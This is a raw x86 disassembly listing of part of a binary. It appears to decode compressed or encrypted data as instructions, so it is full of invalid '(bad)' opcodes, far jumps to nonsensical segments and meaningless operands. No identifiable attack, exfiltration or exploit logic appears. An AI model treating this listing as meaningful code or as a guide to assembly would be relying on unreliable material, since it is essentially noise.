  42977e:	push   ss
  42977f:	and    ch,ch
  429781:	adc    ch,ah
  429783:	push   ebp
  429784:	push   esi
  429785:	jns    0x429798
  429787:	pop    esp
  429788:	push   esi
  429789:	das    
  42978a:	loope  0x429776
  42978c:	jmp    0x0:0x81a9eb
	...
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	adc    DWORD PTR ds:0xbb741bb9,esp
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	dec    ebx
  42980d:	jg     0x429874
  42980f:	js     0x4297a7
  429811:	addr16 sub eax,0xa9d32e84
  429817:	cwde   
  429818:	ja     0x4297c7
  42981a:	fs jno 0x4297c5
  42981d:	cmp    bh,BYTE PTR [ecx-0x4b]
  429820:	stos   BYTE PTR es:[edi],al
  429821:	aas    
  429822:	mov    edx,DWORD PTR [eax+eiz*1]
  429825:	test   eax,0xcf16c957
  42982a:	xchg   ebx,eax
  42982b:	dec    BYTE PTR [ebx]
  42982d:	sbb    ebp,DWORD PTR [ebx+0x6932e4e7]
  429833:	test   BYTE PTR [eax+0x3a],dl
  429836:	cdq    
  429837:	sbb    BYTE PTR gs:[ecx+0x63],0x4a
  42983c:	std    
  42983d:	daa    
  42983e:	pop    eax
  42983f:	(bad)  [ebx-0x31db6e6b]
  429845:	pop    esi
  429846:	mov    ebx,DWORD PTR [eax]
  429848:	inc    eax
  429849:	fwait
  42984a:	ret    0x9d71
  42984d:	cdq    
  42984e:	sbb    eax,0xcf72b498
  429853:	inc    ebx
  429854:	or     DWORD PTR [ebx+edi*1-0x52ca4b59],ebp
  42985b:	add    BYTE PTR [esi-0x3a],0xf0
  42985f:	jo     0x4298bb
  429861:	sub    eax,0xe763dbb3
  429866:	ins    BYTE PTR es:[edi],dx
  429867:	test   eax,0x2f48d6cf
  42986c:	(bad)  
  42986d:	jge    0x4297f9
  42986f:	and    esp,DWORD PTR [edi-0x4b]
  429872:	cmp    ecx,DWORD PTR [ebp-0x77]
  429875:	adc    esp,DWORD PTR [esi-0x1f]
  429878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429879:	push   ss
  42987a:	ret    
  42987b:	and    BYTE PTR [ebx],bl
  42987d:	sbb    bh,ch
  42987f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429880:	add    edx,DWORD PTR [edi]
  429882:	inc    edi
  429883:	hlt    
  429884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429885:	out    0xe7,eax
  429887:	repz xor eax,0xd1e60e00
  42988d:	in     eax,0x7b
  42988f:	and    eax,0xa0dbf8c9
  429894:	fs xchg edx,eax
  429896:	mov    dl,0x58
  429898:	sub    BYTE PTR [esi+0x65],ah
  42989b:	pop    edi
  42989c:	ds adc cl,bh
  42989f:	adc    dh,BYTE PTR [esi]
  4298a1:	or     ah,BYTE PTR [eax+0x72]
  4298a4:	nop
  4298a5:	(bad)  
  4298a6:	fsubr  QWORD PTR [edx-0x39]
  4298a9:	cwde   
  4298aa:	add    al,0xce
  4298ac:	pop    edi
  4298ad:	adc    al,0xce
  4298af:	ins    DWORD PTR es:[edi],dx
  4298b0:	and    ebp,esi
  4298b2:	pop    esi
  4298b3:	inc    ecx
  4298b4:	jno    0x42991f
  4298b6:	sub    esi,DWORD PTR [ecx]
  4298b8:	dec    edi
  4298b9:	and    BYTE PTR [ecx],cl
  4298bb:	pushf  
  4298bc:	(bad)  
  4298be:	(bad)  
  4298bf:	(bad)  
  4298c0:	xor    ebx,DWORD PTR [ecx-0x75948edc]
  4298c6:	sub    BYTE PTR [edx+0x7b],al
  4298c9:	pushf  
  4298ca:	jae    0x429942
  4298cc:	fnstcw WORD PTR [edx-0x15]
  4298cf:	mov    BYTE PTR [ecx+edx*1],dh
  4298d2:	pusha  
  4298d3:	outs   dx,DWORD PTR ds:[esi]
  4298d4:	push   es
  4298d5:	bound  ebx,QWORD PTR [ecx+ebx*2]
  4298d8:	lods   al,BYTE PTR ds:[esi]
  4298d9:	(bad)  
  4298da:	in     al,0x41
  4298dc:	in     eax,0xce
  4298de:	call   0xb7d8:0x37ffdf8
  4298e5:	push   0x2f04237
  4298ea:	ins    DWORD PTR es:[edi],dx
  4298eb:	xor    eax,ecx
  4298ed:	xor    esp,DWORD PTR [edi-0x2d5db436]
  4298f3:	ja     0x42990d
  4298f5:	push   0xffffffe2
  4298f7:	cmp    eax,0x7078a239
  4298fc:	jmp    DWORD PTR [ebx-0x6dfc3cc7]
  429902:	nop
  429903:	imul   esp,DWORD PTR [edi+0x7f857671],0x74b2f723
  42990d:	jbe    0x4298d4
  42990f:	sub    al,0x0
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429981:	cli    
  429982:	jmp    0x1ff125b
  429987:	add    BYTE PTR [ecx+eax*1],al
  42998a:	add    BYTE PTR [eax],al
  42998c:	or     DWORD PTR [esi+0x2],0x7e
  429990:	or     dl,BYTE PTR [ebx]
  429992:	imul   ecx,edi,0x1a5f9d97
  429998:	mov    ch,0xf0
  42999a:	test   BYTE PTR [ecx],bh
  42999c:	daa    
  42999d:	out    0xff,al
  42999f:	leave  
  4299a0:	fwait
  4299a1:	aad    0xde
  4299a3:	mov    bl,bl
  4299a5:	dec    ebp
  4299a6:	mov    DWORD PTR [ecx+ebx*4+0x72dcce5d],edx
  4299ad:	add    ch,BYTE PTR [edi+0x7f]
  4299b0:	jl     0x4299ea
  4299b2:	mov    al,ds:0xb31251db
  4299b7:	or     ecx,ebx
  4299b9:	das    
  4299ba:	pop    eax
  4299bb:	enter  0xcc12,0x40
  4299bf:	loope  0x4299ec
  4299c1:	xlat   BYTE PTR ds:[ebx]
  4299c2:	cmp    cl,0x21
  4299c5:	das    
  4299c6:	outs   dx,BYTE PTR ds:[esi]
  4299c7:	sub    esi,DWORD PTR [ebx+0x33]
  4299ca:	(bad)  
  4299cb:	test   DWORD PTR fs:[eax-0x63],edx
  4299cf:	sub    cl,BYTE PTR [ebx]
  4299d1:	pop    esi
  4299d2:	adc    esi,DWORD PTR [eax]
  4299d4:	inc    ebx
  4299d5:	pusha  
  4299d6:	int    0xa5
  4299d8:	pusha  
  4299d9:	aam    0x5b
  4299db:	dec    esi
  4299dc:	push   eax
  4299dd:	rol    ah,cl
  4299df:	lea    esp,[esi-0x6b880b9b]
  4299e5:	cli    
  4299e6:	test   eax,0x6b143c2
  4299eb:	xchg   DWORD PTR cs:[esi-0x71250c52],ecx
  4299f2:	pop    edi
  4299f3:	and    BYTE PTR [edi-0x80],0x1d
  4299f7:	out    0x28,al
  4299f9:	xor    DWORD PTR [edx],ebx
  4299fb:	sub    eax,0x24825719
  429a00:	gs hlt 
  429a02:	stc    
  429a03:	mov    ch,BYTE PTR [ebx]
  429a05:	jp     0x4299fd
  429a07:	mov    ebp,0xbca74910
  429a0c:	cli    
  429a0d:	fidivr WORD PTR [edx-0xc620b8c]
  429a13:	mov    ah,0xd
  429a15:	fisttp DWORD PTR [edx]
  429a17:	es test eax,0x204cffa2
  429a1d:	mov    ch,0xc7
  429a1f:	repz test ebx,0x82e5e103
  429a26:	sbb    eax,0x4a529012
  429a2b:	gs dec edi
  429a2d:	mov    edi,0xab54367d
  429a32:	xchg   BYTE PTR [esi-0x291d508],ah
  429a38:	fsub   st,st(3)
  429a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a3b:	cmp    BYTE PTR [ecx-0xc],cl
  429a3e:	inc    edx
  429a3f:	out    dx,eax
  429a40:	add    edx,DWORD PTR [ecx-0x4e]
  429a43:	mov    cl,0x7d
  429a45:	add    DWORD PTR [ebp-0x38dd471c],esi
  429a4b:	lahf   
  429a4c:	jmp    0x7723:0xaa6f17eb
  429a53:	cmp    BYTE PTR [edi],ch
  429a55:	mov    ?,WORD PTR fs:[esi+0x40]
  429a59:	mov    eax,0x82308b23
  429a5e:	and    BYTE PTR [ebx-0x6f],al
  429a61:	mov    ds:0xd25eda2f,al
  429a66:	(bad)  [edi]
  429a68:	pusha  
  429a69:	and    eax,0xbfe99847
  429a6e:	enter  0xef1e,0xd6
  429a72:	loopne 0x429a7f
  429a74:	or     BYTE PTR [ebx],ah
  429a76:	pop    esp
  429a77:	jge    0x429ad3
  429a79:	fs add eax,0x48ef377e
  429a7f:	sub    eax,0x42efc82c
  429a84:	popa   
  429a85:	pop    ecx
  429a86:	dec    esp
  429a87:	cmc    
  429a88:	sti    
  429a89:	sbb    DWORD PTR [esi-0x3e05e47f],edx
  429a8f:	pop    edx
	...
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xada95667
  429b01:	std    
  429b02:	dec    edi
  429b03:	(bad)  
  429b04:	jl     0x429ac3
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	add    DWORD PTR [esi-0x12],ebx
  429b0f:	popa   
  429b10:	fsubr  st(0),st
  429b12:	mov    WORD PTR [esi-0x44],?
  429b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b16:	(bad)  
  429b17:	mov    bh,0xe0
  429b19:	or     eax,0x2bd9d8c6
  429b1e:	mov    ch,0xb3
  429b20:	cwde   
  429b21:	loop   0x429b0c
  429b23:	stos   BYTE PTR es:[edi],al
  429b24:	sub    ecx,esi
  429b26:	xchg   ebp,eax
  429b27:	jb     0x429b94
  429b29:	sub    cl,BYTE PTR [edi-0x148ff534]
  429b2f:	aad    0x13
  429b31:	test   BYTE PTR [ebp-0x5d],bh
  429b34:	sub    edx,0xffffffd8
  429b37:	fwait
  429b38:	test   eax,0x3ba71744
  429b3d:	(bad)  
  429b3e:	mov    bh,0x26
  429b40:	bound  eax,QWORD PTR [esi+0x1e]
  429b43:	add    edi,DWORD PTR [esi+0xb]
  429b46:	popa   
  429b47:	test   ch,ch
  429b49:	in     eax,0xc2
  429b4b:	mov    bl,0x51
  429b4d:	dec    ebx
  429b4e:	xchg   edi,eax
  429b4f:	or     BYTE PTR [ecx+ebx*2-0xfda1b40],0x34
  429b57:	add    eax,0x9cd6d5f8
  429b5c:	jmp    0xb8b3:0xa69e0955
  429b63:	xchg   esp,eax
  429b64:	xor    eax,0x379060da
  429b69:	das    
  429b6a:	(bad)  
  429b6b:	mov    dl,0x74
  429b6d:	dec    eax
  429b6e:	rol    DWORD PTR [ebx+0x6a17dc14],cl
  429b74:	fcmovb st,st(7)
  429b76:	add    bl,ch
  429b78:	push   es
  429b79:	ss rcl DWORD PTR gs:[ecx],1
  429b7d:	fnop   
  429b7f:	stos   DWORD PTR es:[edi],eax
  429b80:	inc    eax
  429b81:	xchg   DWORD PTR ds:0xc21b1e58,edi
  429b87:	push   ecx
  429b88:	mov    dl,BYTE PTR [ebp-0x7e249b32]
  429b8e:	cdq    
  429b8f:	fsubr  DWORD PTR [eax-0x56]
  429b92:	sub    BYTE PTR [edi-0x3704a0be],0x5b
  429b99:	fild   DWORD PTR [esi-0x247c2a14]
  429b9f:	mov    al,ds:0x7b6dfc03
  429ba4:	stos   DWORD PTR es:[edi],eax
  429ba5:	pop    esp
  429ba6:	daa    
  429ba7:	dec    ecx
  429ba8:	add    al,BYTE PTR [esi-0x26]
  429bab:	out    0x1,eax
  429bad:	jecxz  0x429b89
  429baf:	adc    al,0xfd
  429bb1:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bb3:	call   0x19bc:0x9fab248e
  429bba:	mov    ch,0xc0
  429bbc:	inc    edx
  429bbd:	add    ah,BYTE PTR [esi+0x6ba5185]
  429bc3:	pop    ebp
  429bc4:	cwde   
  429bc5:	lock rcl DWORD PTR [esi],cl
  429bc8:	in     eax,dx
  429bc9:	and    al,bl
  429bcb:	call   0xad95:0x9e0bd7e7
  429bd2:	push   es
  429bd3:	lds    ebp,FWORD PTR [ecx]
  429bd5:	fwait
  429bd6:	mov    ds:0x4c03ff02,al
  429bdb:	out    0x23,eax
  429bdd:	ja     0x429c30
  429bdf:	dec    ebx
  429be0:	xor    DWORD PTR [edi+ebx*4+0x7c],edx
  429be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429be5:	dec    ecx
  429be6:	(bad)  
  429be7:	pop    ecx
  429be8:	push   ebp
  429be9:	cli    
  429bea:	mov    BYTE PTR [si],0x1
  429bee:	in     al,dx
  429bef:	call   0x2739a32f
  429bf4:	pop    ebx
  429bf5:	push   edi
  429bf6:	mov    dl,0x1c
  429bf8:	xchg   ebx,eax
  429bf9:	jno    0x429c79
  429bfb:	cmp    DWORD PTR [edi],0xad86117d
  429c01:	push   ds
  429c02:	xlat   BYTE PTR ds:[ebx]
  429c03:	fild   WORD PTR [eax-0x16]
  429c06:	cwde   
  429c07:	aas    
  429c08:	and    al,0xcf
  429c0a:	(bad)  
  429c0b:	test   eax,0x86423375
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ebx-0x7f26b0c9],ah
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	daa    
  429c8d:	xchg   esi,eax
  429c8e:	mov    BYTE PTR [edi-0x58],cl
  429c91:	call   0x6a52:0x3b16954f
  429c98:	sar    BYTE PTR [edx],1
  429c9a:	jne    0x429cb3
  429c9c:	jae    0x429ca8
  429c9e:	mov    edx,DWORD PTR [edx]
  429ca0:	sub    BYTE PTR [ebp-0x775c9411],0xbb
  429ca7:	mov    DWORD PTR [edi],edi
  429ca9:	jmp    0xe5e4c610
  429cae:	jmp    0xb5b0:0xb2799e11
  429cb5:	pop    ebx
  429cb6:	sbb    eax,0x625e493b
  429cbb:	int3   
  429cbc:	fistp  QWORD PTR [ebp-0x5a]
  429cbf:	dec    ebx
  429cc0:	cmp    eax,0x62267e3f
  429cc5:	mov    dh,0xa0
  429cc7:	int    0xf9
  429cc9:	aam    0xc7
  429ccb:	call   0xd510b300
  429cd0:	push   ebx
  429cd1:	iret   
  429cd2:	inc    eax
  429cd3:	jmp    0x429d3f
  429cd5:	(bad)  
  429cd7:	rcl    ch,1
  429cd9:	dec    edi
  429cda:	shl    DWORD PTR [eax+edx*4],1
  429cdd:	jmp    0x429d49
  429cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429ce0:	fisttp QWORD PTR [edi-0x11]
  429ce3:	fsub   QWORD PTR [edx+edx*4+0x56]
  429ce7:	cmc    
  429ce8:	xchg   ebx,eax
  429ce9:	push   es
  429cea:	xchg   ebp,eax
  429ceb:	retf   
  429cec:	enter  0x28f0,0x48
  429cf0:	out    0x4a,al
  429cf2:	dec    edi
  429cf3:	sahf   
  429cf4:	ds call 0x43cefc3d
  429cfa:	sbb    al,0x7d
  429cfc:	and    ch,0x20
  429cff:	inc    DWORD PTR [ecx-0x33705324]
  429d05:	jno    0x429d57
  429d07:	loop   0x429cb5
  429d09:	(bad)  
  429d0a:	jmp    0xa7175ad8
  429d0f:	mov    esi,0x5d7567e4
  429d14:	sub    eax,0x124a668c
  429d19:	or     eax,0xc24484b3
  429d1e:	daa    
  429d1f:	out    dx,al
  429d20:	ffree  st(2)
  429d22:	or     BYTE PTR [eax+0x58],dl
  429d25:	adc    ebx,ebx
  429d27:	mov    ds:0xd57bff94,al
  429d2c:	ret    0xd68
  429d2f:	in     eax,dx
  429d30:	sub    eax,0xddd03594
  429d35:	cmc    
  429d36:	mov    esp,ebx
  429d38:	sbb    DWORD PTR [ecx-0x79],esp
  429d3b:	cld    
  429d3c:	imul   esi,ebp,0x32
  429d3f:	repnz cli 
  429d41:	mov    al,ds:0xe93fb6cd
  429d46:	aam    0x12
  429d48:	cdq    
  429d49:	mov    BYTE PTR [ebx+0x24],dl
  429d4c:	fdivrp st(2),st
  429d4e:	xchg   BYTE PTR [esi-0x23cd2bf9],cl
  429d54:	je     0x429d64
  429d56:	sbb    al,0x11
  429d58:	jmp    0x429cda
  429d5a:	enter  0xd806,0x72
  429d5e:	fiadd  DWORD PTR [esi+0x77d4266f]
  429d64:	sbb    edi,DWORD PTR [edx+0x5ddd27a5]
  429d6a:	xchg   BYTE PTR [ebx-0x1e8add44],ch
  429d70:	sub    BYTE PTR [ebp-0x74],ah
  429d73:	call   0x64ab:0x4631cf82
  429d7a:	jmp    0x63e4:0x384700df
  429d81:	(bad)  
  429d83:	(bad)  
  429d85:	stc    
  429d86:	scas   al,BYTE PTR es:[edi]
  429d87:	push   0x6c
  429d89:	rcl    BYTE PTR [ebp+0xd],0xfc
  429d8d:	push   edx
  429d8e:	push   edi
  429d8f:	aas    
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	cli    
  429e01:	cmp    DWORD PTR [eax+0x44],esp
  429e04:	test   BYTE PTR [edi+0x1040001],bh
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	out    dx,eax
  429e0d:	push   edx
  429e0e:	inc    ebx
  429e0f:	les    ecx,FWORD PTR [ebp-0x10]
  429e12:	mov    ds:0x5ec1301c,al
  429e17:	in     al,dx
  429e18:	cld    
  429e19:	scas   eax,DWORD PTR es:[edi]
  429e1a:	cmp    ah,BYTE PTR [eax+0x2e5a7b03]
  429e20:	dec    esi
  429e21:	pop    ss
  429e22:	out    0x33,al
  429e24:	ss cmp dl,cl
  429e27:	mov    edi,0x313d6fa4
  429e2c:	and    al,0x80
  429e2e:	mov    bh,0x5f
  429e30:	fdivr  st(7),st
  429e32:	mov    eax,ds:0x33485ee8
  429e37:	das    
  429e38:	dec    ecx
  429e39:	sub    al,0x5f
  429e3b:	jecxz  0x429e45
  429e3d:	mov    ebx,0x2c02c32e
  429e42:	xor    eax,eax
  429e44:	add    dl,cl
  429e46:	jbe    0x429e3f
  429e48:	cmp    eax,0xdf4ba47d
  429e4d:	xor    BYTE PTR [ebx-0x7b],0x3c
  429e51:	shr    edx,cl
  429e53:	stc    
  429e54:	rol    BYTE PTR [esi],0x12
  429e57:	out    0xcc,eax
  429e59:	inc    BYTE PTR cs:[edi+0x62]
  429e5d:	adc    dl,BYTE PTR [esi]
  429e5f:	mov    dl,0x46
  429e61:	dec    ebp
  429e62:	fs push es
  429e64:	popa   
  429e65:	call   FWORD PTR [eax+0x423a8879]
  429e6b:	fistp  DWORD PTR [ebp+0x749b9a8d]
  429e71:	fcomp  QWORD PTR [ebx+0x5d]
  429e74:	bound  edx,QWORD PTR [ecx-0x68]
  429e77:	cmp    DWORD PTR [eax-0x53349e93],esi
  429e7d:	(bad)  
  429e7e:	inc    DWORD PTR [ecx+0x3a1f4c93]
  429e84:	inc    esp
  429e85:	xor    DWORD PTR [ecx-0x71],eax
  429e88:	aas    
  429e89:	or     BYTE PTR [esi+0x1e106709],al
  429e8f:	push   0x59ada187
  429e94:	inc    ecx
  429e95:	jbe    0x429f0c
  429e97:	ror    DWORD PTR [ebp-0x668f7640],1
  429e9d:	pop    ebx
  429e9e:	in     al,0xcd
  429ea0:	cmp    ebp,DWORD PTR [edx]
  429ea2:	lods   al,BYTE PTR ds:[esi]
  429ea3:	pushf  
  429ea4:	lahf   
  429ea5:	mov    ch,ah
  429ea7:	jb     0x429f17
  429ea9:	add    eax,eax
  429eab:	jno    0x47052c12
  429eb1:	lahf   
  429eb2:	loopne 0x429e8f
  429eb4:	pop    eax
  429eb5:	push   edi
  429eb6:	xor    al,0x51
  429eb8:	dec    ebx
  429eb9:	sbb    BYTE PTR [ebp+0x74],dh
  429ebc:	ss sbb esp,edi
  429ebf:	lock stos DWORD PTR es:[edi],eax
  429ec1:	xchg   esp,eax
  429ec2:	aam    0x6d
  429ec4:	push   es
  429ec5:	mov    bh,0xd8
  429ec7:	lods   eax,DWORD PTR ds:[esi]
  429ec8:	mov    eax,ds:0xd332b5e8
  429ecd:	sbb    eax,0xe49920db
  429ed2:	xchg   ebx,eax
  429ed3:	ins    DWORD PTR es:[edi],dx
  429ed4:	cs jmp 0xfb0b86d8
  429eda:	mov    ds:0xdaf1817a,eax
  429edf:	test   DWORD PTR ds:0xbe2e79b4,0xdd188c34
  429ee9:	in     eax,dx
  429eea:	add    BYTE PTR [edx+0x13],dh
  429eed:	out    dx,al
  429eee:	mov    al,0xa0
  429ef0:	ins    DWORD PTR es:[edi],dx
  429ef1:	xor    DWORD PTR [ecx+0x3a7eaadc],0x7cf0e58d
  429efb:	cmp    eax,0xb5beb5cb
  429f00:	lods   al,BYTE PTR ds:[esi]
  429f01:	jle    0x429eb5
  429f03:	mov    ebx,0x730824b4
  429f08:	xor    ebx,DWORD PTR [ebp+0x2934729e]
  429f0e:	mov    bh,0x4
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x77d3ddab]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	xlat   BYTE PTR ds:[ebx]
  429f8d:	outs   dx,DWORD PTR ds:[esi]
  429f8e:	pop    ss
  429f8f:	sar    BYTE PTR [esi-0x63],1
  429f92:	xchg   BYTE PTR [ecx],cl
  429f94:	inc    ebx
  429f95:	sbb    edx,ecx
  429f97:	add    cl,0x57
  429f9a:	adc    BYTE PTR [ecx],al
  429f9c:	ret    0x181f
  429f9f:	pop    es
  429fa0:	dec    ecx
  429fa1:	add    edi,DWORD PTR [ebx]
  429fa3:	xor    DWORD PTR [eax],ecx
  429fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fa6:	ret    0xaf40
  429fa9:	outs   dx,DWORD PTR ds:[esi]
  429faa:	popa   
  429fab:	mul    esi
  429fad:	jecxz  0x429f7e
  429faf:	dec    ebx
  429fb0:	mov    ebp,0x333974a3
  429fb5:	mov    al,0x28
  429fb7:	or     al,0xf
  429fb9:	fisttp DWORD PTR [ecx]
  429fbb:	cdq    
  429fbc:	sahf   
  429fbd:	dec    ebp
  429fbe:	inc    edx
  429fbf:	cli    
  429fc0:	ins    BYTE PTR es:[edi],dx
  429fc1:	out    dx,eax
  429fc2:	inc    edx
  429fc3:	or     DWORD PTR [ebx],0xbc478c96
  429fc9:	mul    BYTE PTR [edi+0x4f]
  429fcc:	retf   
  429fcd:	retf   0x1f71
  429fd0:	inc    edx
  429fd1:	jne    0x429fc4
  429fd3:	test   eax,0x650f8eea
  429fd8:	inc    ebp
  429fd9:	mov    dl,0xe6
  429fdb:	xor    BYTE PTR [esi+0x58],dh
  429fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fdf:	mov    bh,0x7d
  429fe1:	push   cs
  429fe2:	cmc    
  429fe3:	fstp   st(3)
  429fe5:	add    al,BYTE PTR [esi]
  429fe7:	sahf   
  429fe8:	cmp    al,0x90
  429fea:	leave  
  429feb:	sbb    dh,BYTE PTR [esi+esi*4]
  429fee:	stc    
  429fef:	cmp    al,0x46
  429ff1:	pusha  
  429ff2:	jnp    0x42a026
  429ff4:	dec    BYTE PTR [ecx-0x4d]
  429ff7:	sbb    ebx,DWORD PTR [ecx+0x4eec326f]
  429ffd:	les    edi,FWORD PTR [ecx-0x23]
  42a000:	aas    
  42a001:	(bad)  [edi]
  42a003:	outs   dx,BYTE PTR ds:[esi]
  42a004:	outs   dx,DWORD PTR ds:[esi]
  42a005:	out    0xb0,eax
  42a007:	and    al,0x93
  42a009:	pop    edi
  42a00a:	mov    cl,BYTE PTR [esi+0x68417660]
  42a010:	add    BYTE PTR [edi+0x48],dh
  42a013:	retf   
  42a014:	push   esi
  42a015:	cwde   
  42a016:	mul    DWORD PTR ds:0xb0077dd6
  42a01c:	push   edx
  42a01d:	cdq    
  42a01e:	imul   ebx,DWORD PTR [edx-0x7f],0xffffffee
  42a022:	mov    ds:0x41faae68,eax
  42a027:	les    edi,FWORD PTR [ebx-0x1a4bf0ca]
  42a02d:	and    ebp,DWORD PTR [eax-0x288038c8]
  42a033:	jecxz  0x42a0a8
  42a035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a036:	bound  edi,QWORD PTR [ebx]
  42a038:	adc    BYTE PTR [ebp+0x6ad77df5],0x65
  42a03f:	mov    edi,DWORD PTR [ebp+0x474dac89]
  42a045:	cmp    DWORD PTR [ebx],edi
  42a047:	stos   BYTE PTR es:[edi],al
  42a048:	stc    
  42a049:	adc    eax,0x27127249
  42a04e:	ins    BYTE PTR es:[edi],dx
  42a04f:	fsub   QWORD PTR [eax-0x57]
  42a052:	pop    ebp
  42a053:	lods   al,BYTE PTR ds:[esi]
  42a054:	and    BYTE PTR [ecx-0x441b7482],0xde
  42a05b:	cmp    BYTE PTR [edx],0x4d
  42a05e:	nop
  42a05f:	loop   0x42a061
  42a061:	push   edi
  42a062:	cbw    
  42a064:	js     0x42a05b
  42a066:	inc    ebp
  42a067:	cmp    al,BYTE PTR [ebx+0x2f]
  42a06a:	enter  0x877a,0x62
  42a06e:	cld    
  42a06f:	test   DWORD PTR [eax],ebx
  42a071:	in     eax,dx
  42a072:	call   0x9b1f00b1
  42a077:	icebp  
  42a078:	xchg   edx,eax
  42a079:	mov    esi,0xee562c54
  42a07e:	or     al,0x10
  42a080:	mov    ebp,0xb3153271
  42a085:	(bad)  
  42a086:	jl     0x42a068
  42a088:	fwait
  42a089:	idiv   DWORD PTR [esi+ebx*1+0x20896579]
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	retf   0xd49
  42a103:	mov    al,0x8c
  42a105:	rol    DWORD PTR [ecx],0x0
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	fwait
  42a10d:	pop    ebx
  42a10e:	cmp    DWORD PTR [edx+0x41],0x99e42252
  42a115:	push   cs
  42a116:	push   es
  42a117:	jae    0x42a0b2
  42a119:	xchg   esi,eax
  42a11a:	jmp    0x42a0a3
  42a11c:	movntq QWORD PTR [edi+ebx*2-0x64],mm1
  42a121:	cmp    al,0x7f
  42a123:	call   0x56110cff
  42a128:	add    al,0x9f
  42a12a:	sub    BYTE PTR [edi-0x60],cl
  42a12d:	pop    ebx
  42a12e:	inc    ebx
  42a12f:	inc    ebx
  42a130:	jp     0x42a0f2
  42a132:	lods   al,BYTE PTR ds:[esi]
  42a133:	lahf   
  42a134:	sti    
  42a135:	xchg   esp,eax
  42a136:	pop    ss
  42a137:	sub    BYTE PTR [ecx-0x66],bl
  42a13a:	jb     0x42a0f4
  42a13c:	test   BYTE PTR [edx+edx*2],ah
  42a13f:	outs   dx,BYTE PTR ds:[esi]
  42a140:	std    
  42a141:	inc    ebx
  42a142:	jecxz  0x42a147
  42a144:	push   ds
  42a145:	mov    ds:0x7d08450,eax
  42a14a:	scas   al,BYTE PTR es:[edi]
  42a14b:	stc    
  42a14c:	ds pop ecx
  42a14e:	cld    
  42a14f:	pop    edi
  42a150:	js     0x42a188
  42a152:	push   ecx
  42a153:	(bad)  
  42a154:	push   ebx
  42a155:	mov    eax,0x992bd08
  42a15a:	jl     0x42a18b
  42a15c:	inc    edx
  42a15d:	jbe    0x42a172
  42a15f:	sbb    eax,0x849f4c6f
  42a164:	mov    ebx,0x3d2dfc0e
  42a169:	das    
  42a16a:	ins    BYTE PTR es:[edi],dx
  42a16b:	cmp    esi,0x5d
  42a16e:	xor    eax,0x1f40239d
  42a173:	inc    ebp
  42a174:	popa   
  42a175:	or     eax,0xdeb145c1
  42a17a:	pop    eax
  42a17b:	xchg   ebx,eax
  42a17c:	test   BYTE PTR [edx],cl
  42a17e:	jmp    0xd20bcc26
  42a183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a184:	push   es
  42a185:	add    DWORD PTR [esi],esp
  42a187:	or     dh,BYTE PTR ds:0x69d3f0c2
  42a18d:	sbb    eax,0x89962b1b
  42a192:	call   0x9348:0x474f1f6d
  42a199:	lods   eax,DWORD PTR ds:[esi]
  42a19a:	rcl    dl,1
  42a19c:	mov    al,ds:0x1861384e
  42a1a1:	mov    ebx,0x4a9386a6
  42a1a6:	cmp    esp,DWORD PTR [edx-0x7d]
  42a1a9:	mov    al,ds:0xc8dd07a
  42a1ae:	in     al,0x16
  42a1b0:	push   ebx
  42a1b1:	(bad)  
  42a1b2:	ds jnp 0x42a1b7
  42a1b5:	inc    ebx
  42a1b6:	js     0x42a22e
  42a1b8:	mov    esi,0x392dc9c3
  42a1bd:	pop    ecx
  42a1be:	sub    al,0xf6
  42a1c0:	mov    ds:0xec4ab8fe,eax
  42a1c5:	or     BYTE PTR [edi-0x7979ef1f],cl
  42a1cb:	pushf  
  42a1cc:	inc    ebp
  42a1cd:	scas   eax,DWORD PTR es:[edi]
  42a1ce:	push   edx
  42a1cf:	fdiv   QWORD PTR [edi]
  42a1d1:	leave  
  42a1d2:	mov    cl,0xbe
  42a1d4:	(bad)  
